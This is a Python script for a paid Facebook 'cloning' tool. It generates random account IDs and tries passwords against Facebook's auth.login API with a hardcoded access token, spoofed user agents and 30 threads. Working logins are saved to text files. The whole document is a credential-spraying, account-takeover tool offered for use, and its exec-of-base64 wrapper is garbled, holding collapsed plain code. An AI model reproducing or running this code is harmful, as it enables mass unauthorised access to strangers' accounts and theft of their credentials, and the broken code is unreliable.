import base64
exec(base64.b64decode("W = '\033[97;1m' R = '\033[91;1m' G = '\033[92;1m' Y = '\033[93;1m' B = '\033[94;1m'P = '\033[95;1m'C = '\033[96;1m'N = '\x1b[0m'import ostry:	import requestsexcept ImportError:	os.system("pip install requests")try:	import concurrent.futuresexcept ImportError:	os.system("pip install futures")import osimport sysimport timeimport requestsimport randomimport platformimport base64import subprocessfrom concurrent.futures import ThreadPoolExecutordef runtxt(z):    for e in z + "\n":        sys.stdout.write(e)        sys.stdout.flush()        time.sleep(0.03)def helpnote():	print("%s [=>] FOLLOW ME ON  FB TO KNOW ABOUT UPDATES  :)"%(G))		subprocess.check_output(["am", "start", "https://github.com/TheSaim07/Saim/blob/main/Approval"])		exit(" [=>] FACEBOOK :  https://facebook.com/groups/607060572985523/")def notice(): 	runtxt("\n\033[0;91m YOU'RE NOT PREMIUM USER - YOU NEED TO PAY FIRST ")	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))	runtxt("\033[0;96m ADMIN WHATSAPP NUMBER  >> +923248395018")	subprocess.check_output(["am", "start", "https://wa.me/+923248395018"])	runtxt("\033[0;95m    <===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================> ")        plist = (platform.uname())[2]basex = plistbasex1 = basex.encode('ascii')basex2 = base64.b64encode(basex1)basex3 = basex2.decode('ascii')base4 = (basex3).upper()basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')class Main:	def __init__(self):		self.id = []		self.ok = []		self.cp = []		self.loop = 0		try:			plr = requests.get('https://github.com/TheSaim07/Saim/blob/main/Approval').text			if basesplit in plr:				key = basesplit				stat = ("\033[0;92mPREMIUM")				FY = '\033[0;93m'				FG = '\033[0;92m'				GET = '\r'			else:				key = ("\033[0;91m -")				stat = ("\033[0;91mFREE USER")				FY = '\033[0;90m'				FG = '\033[0;90m'				GET = '\033[0;92m [P] GET PREMIUM'		except requests.exceptions.ConnectionError:			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))			exit()		os.system("clear")				print ("""\033[1;92m   ___ _  _   _   ___  ___ ___   / __| || | /_\ | _ \/ __|_ _| | (__| __ |/ _ \|   /\__ \| |   \___|_||_/_/ \_\_|_\|___/___|                                                                                         _______   ______  ___                    / __/ _ | /  _/  |/  /                   _\ \/ __ |_/ // /|_/ /                   /___/_/ |_/___/_/  /_/                          \033[97;1m╔═\033[95;1m═══\033[94;1m═══\033[93;1m═══\033[92;1m═══\033[91;1m═══\033[97;1m═══\033[95;1m═══\033[94;1m═══\033[93;1m═══\033[92;1m═══\033[91;1m═══\033[97;1m═══\033[95;1m═══\033[94;1m═╗ \033[91;1m║ ⌦ \033[1;92mDEVELOPER  : [ STC ]           	  \033[93;1m║\033[92;1m║ ⌦ \033[1;92mFACEBOOK   : [ S T C ]   	          \033[92;1m║\033[93;1m║ ⌦ \033[1;92mWHATSAPP   : +923248395018  	  \033[91;1m║\033[94;1m║ ⌦ \033[1;92mGITHUB     : [ CHARSI_GANG ]          \033[97;1m║\033[95;1m╚═\033[94;1m═══\033[95;1m═══\033[97;1m═══\033[91;1m═══\033[92;1m═══\033[93;1m═══\033[94;1m═══\033[95;1m═══\033[97;1m═══\033[91;1m═══\033[92;1m═══\033[93;1m═══\033[94;1m═══\033[95;1m═╝   """)		print("%s [%s•%s] %sTOOL NAME : %sSTC-TOOL"%(G,R,G,B,G))		print("%s [%s•%s] %sVERSION   : %s2.1.3"%(G,R,G,B,G))		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 		print("")		runtxt("\033[1;92m <====== 𝐀𝐋𝐋 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐓𝐑𝐈𝐂𝐊𝐒 𝐀𝐍𝐃 𝐇𝐄𝐋𝐏𝐈𝐍𝐆 𝐙𝐎𝐍𝐄 ======>")		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW} %s(PAID)"%(G,R,G,Y,B))		print("%s [%s2%s]%s GO TO V2 CLONER (2004-2007) %s(PRO)"%(G,R,G,Y,B))		print("%s [%s3%s]%s GO TO V3 CLONER (2008) %s(PRO MAX)"%(G,R,G,Y,B))		print("%s [%s4%s]%s FILE CLONING {MAINTENANCE} %s(TOP RATED)"%(G,R,G,Y,B))		print("")				type = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")		if type in ["", " "]:			Main()		elif type in ["1", "01"]:			if basesplit in plr:			        self.fbtua()			else: 				notice()				exit()		elif type in ["2", "02"]:			if basesplit in plr:			        self.old4_7()			else: 				notice()				exit()		elif type in ["3", "03"]:			if basesplit in plr:			        self.old_8()			else: 				notice()				exit()				else:			Main()	def fbtua(self):		x = 111111111		xx = 999999999		idx = "100000" 		limit = int(input("    \033[0;91m[+]\033[0;92m HOW MANY IDz YOU WANNA CRACK (MAX 50,000): "))		try:			for n in range(limit):				_ = random.randint(x,xx)				__ = idx				self.id.append(__+str(_))			print("\033[91;1m    [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 			with ThreadPoolExecutor(max_workers=30) as coeg:				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))				if len(listpass)<=5:					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))				print("\n%s [+] OK IDz STORED IN -> C-OK.txt"%(G))				print("%s [+] CP IDz STORED IN -> C-CP.txt"%(G))				runtxt("\n\033[91;1m NOTE : FOR MORE OK IDz TURN ON AIRPLANE MODE FOR 5 SEC \033[0;97m ")				runtxt("\n            \033[93;1m CTRL + Z TO STOP CLONING PROCESS \033[0;97m ")				for user in self.id:					coeg.submit(self.api, user, listpass.split(","))			exit("\n\n    [#] CRACK COMPLETE...")		except Exception as e:exit(str(e))					def old4_7(self):		x = 1111111		xx = 9999999		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(G,B))		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])		limit = int(input("\033[0;97m [+] ENTER LIMIT \033[0;92m(50,000 MAX): \033[0;96m"))		if (limit)>50000:			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(D))		try:			for n in range(limit):				_ = random.randint(x,xx)				__ = idx				self.id.append(__+str(_))			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 			with ThreadPoolExecutor(max_workers=30) as coeg:				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))				if len(listpass)<=5:					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))				print("\n%s [+] OK IDz STORED IN -> X-OK.txt"%(G))				print("%s [+] CP IDz STORED IN -> X-CP.txt"%(G))				runtxt("\n\033[91;1m NOTE : FOR MORE OK IDz TURN ON AIRPLANE MODE FOR 5 SEC \033[0;97m ")				runtxt("\n            \033[93;1m CTRL + Z TO STOP CLONING PROCESS \033[0;97m ")				for user in self.id:					coeg.submit(self.api, user, listpass.split(","))			exit("\n\n    [#] CRACK COMPLETE...")		except Exception as e:exit(str(e))	def old_8(self):		x = 11111111		xx = 99999999		idx = "100000" 		limit = int(input("    \033[0;91m[+]\033[0;92m HOW MANY IDz YOU WANNA CRACK (MAX 50,000): "))		try:			for n in range(limit):				_ = random.randint(x,xx)				__ = idx				self.id.append(__+str(_))			print("\033[91;1m    [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 			with ThreadPoolExecutor(max_workers=30) as coeg:				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))				if len(listpass)<=5:					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))				print("\n%s [+] OK IDz STORED IN -> S-OK.txt"%(G))				print("%s [+] CP IDz STORED IN -> S-CP.txt"%(G))				runtxt("\n\033[91;1m NOTE : FOR MORE OK IDz TURN ON AIRPLANE MODE FOR 5 SEC \033[0;97m ")				runtxt("\n            \033[93;1m CTRL + Z TO STOP CLONING PROCESS \033[0;97m ")				for user in self.id:					coeg.submit(self.api, user, listpass.split(","))			exit("\n\n    [#] CRACK COMPLETE...")		except Exception as e:exit(str(e))	def api(self, uid, pwx):		ua = random.choice([			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",			"Dalvik/2.1.0 (Linux; U; Android 10; Redmi 8A MIUI/V12.5.3.0.QCPEUXM)" 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"			"Mozilla/5.0 (Android 9; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0"			"Mozilla/5.0 (Linux; Android 10; moto e) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Mobile Safari/537.36 OPR/70.3.3653.66287"			"Mozilla/5.0 (Linux; Android 11; Redmi K20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"			"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"			"Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi 9C NFC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn"			"Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]"			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 OPR/84.0.4316.14"			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3882.0;]"			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.06;"		])		sys.stdout.write(			"\r\r %s[>_] [CHARSI] : %s/%s -> \033[0;92m [OK:%s]-\033[0;91m[CP:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))		); sys.stdout.flush()		for pw in pwx:			pw = pw.lower()			ses = requests.Session()			headers = {				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 				"x-fb-sim-hni": str(random.randint(20000, 40000)), 				"x-fb-net-hni": str(random.randint(20000, 40000)), 				"x-fb-connection-quality": "EXCELLENT",				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",				"user-agent": ua, 				"content-type": "application/x-www-form-urlencoded", 				"x-fb-http-engine": "Liger"			}			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 			if "session_key" in response.text and "EAAA" in response.text:				print("\r  \033[0;92m   [CHARSI-OK] %s | %s\033[0;97m         "%(uid, pw))				self.ok.append("%s|%s"%(uid, pw))				open("S-OK.txt","a").write("  * --> %s|%s\n"%(uid, pw))				break			elif "www.facebook.com" in response.json()["error_msg"]:				print("\r  \033[0;91m   [CHARSI-CP] %s | %s\033[0;97m         "%(uid, pw))				self.cp.append("%s|%s"%(uid, pw))				open("S-CP.txt","a").write("  * --> %s|%s\n"%(uid, pw))				break			else:				continue		self.loop +=1if len(sys.argv) == 2:	if sys.argv[1] == "--info":		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")		exit(" [*] GitHub    : https://github.com/ ")	else:		Main()try:Main()except Exception as e:exit(str(e))"))